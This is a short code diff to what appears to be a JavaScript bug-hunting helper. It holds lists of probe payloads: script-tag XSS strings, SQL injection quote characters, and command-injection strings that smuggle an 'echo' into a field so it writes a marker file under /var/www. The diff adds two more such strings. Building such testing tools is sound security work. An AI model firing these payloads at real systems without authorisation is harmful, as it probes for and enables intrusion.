@@ -18,7 +18,7 @@ function JsBugHuntingHelper () {
 
   const payloadsXSS = ['<script>alert("XSS_VULNERABLE_PARAM")</script>', '"><script>alert("XSS_VULNERABLE_PARAM")</script><div ', "'"]
   const payloadsSQLi = ['"', "'"]
-  const payloadsRCE = ['test" || echo "TEST_RCE" > /var/www/html/testRCE.php#', 'echo "TEST_RCE" > /var/www/html/testRCE.php#']
+  const payloadsRCE = ['test" || echo "TEST_RCE" > /var/www/html/testRCE.php#', 'echo "TEST_RCE" > /var/www/html/testRCE.php#','test" || echo "TEST_RCE" > /var/www/testRCE.php#', 'echo "TEST_RCE" > /var/www/testRCE.php#']
 
   // eslint-disable-next-line no-multiple-empty-lines
   // eslint-disable-next-line no-unused-vars
